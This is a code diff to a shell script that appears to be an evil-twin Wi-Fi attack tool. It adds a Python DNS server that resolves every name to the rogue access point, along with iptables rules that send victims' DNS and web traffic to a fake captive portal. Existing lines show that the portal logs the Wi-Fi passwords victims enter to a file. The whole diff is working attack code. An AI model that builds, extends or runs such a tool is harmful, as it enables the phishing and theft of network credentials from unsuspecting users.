@@ -642,7 +642,44 @@ create_captive_portal() {
     local essid="${1}"
     local script_path="${TMP_DIR}/captive_portal.py"
     local log_path="${TMP_DIR}/passwords.txt"
+    local dns_script="${TMP_DIR}/dns_server.py"
     mkdir -p "${TMP_DIR}"
+
+    cat > "${dns_script}" << 'PYEOF'
+import socket, struct, datetime, sys
+
+AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.3.1"
+LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/dns.log"
+
+ip_parts = [int(x) for x in AP_IP.split(".")]
+ip_bytes = struct.pack("!BBBB", *ip_parts)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(("0.0.0.0", 53))
+
+while True:
+    data, addr = sock.recvfrom(512)
+    if len(data) < 12:
+        continue
+    tid = data[:2]
+    flags = b"\x81\x80"
+    qdcount = struct.unpack("!H", data[4:6])[0]
+    ancount = struct.pack("!H", qdcount)
+    response = tid + flags + struct.pack("!HHHH", qdcount, qdcount, 0, 0)
+    pos = 12
+    for _ in range(qdcount):
+        end = data.find(b"\x00", pos)
+        if end == -1:
+            break
+        qname = data[pos:end+1]
+        qtype = data[end+1:end+3]
+        pos = end + 5
+        response += qname + qtype + b"\x00\x01"
+        response += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + ip_bytes
+    sock.sendto(response, addr)
+PYEOF
+
     cat > "${script_path}" << 'PYEOF'
 #!/usr/bin/env python3
 import http.server, urllib.parse, sys, os, datetime
@@ -747,8 +784,10 @@ cleanup() {
         iw dev "${iface}" del 2>/dev/null || true
     done
     pkill -f "captive_portal.py" 2>/dev/null || true
+    pkill -f "dns_server.py" 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
     iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
     iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
     iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
@@ -896,11 +935,16 @@ main() {
                                 ;;
                             c|C)
                                 if [ "${portal_running}" == false ]; then
-                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal on port 80...${WHITE}"
+                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal...${WHITE}"
                                     create_captive_portal "${selected_essid}"
+
                                     iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80
                                     iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80
+                                    iptables -t nat -A PREROUTING -i at0 -p udp --dport 53 -j REDIRECT --to-port 53
+
+                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns.log" "dns_server"
                                     run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80" "captive_portal"
+
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                                     portal_running=true
                                 else
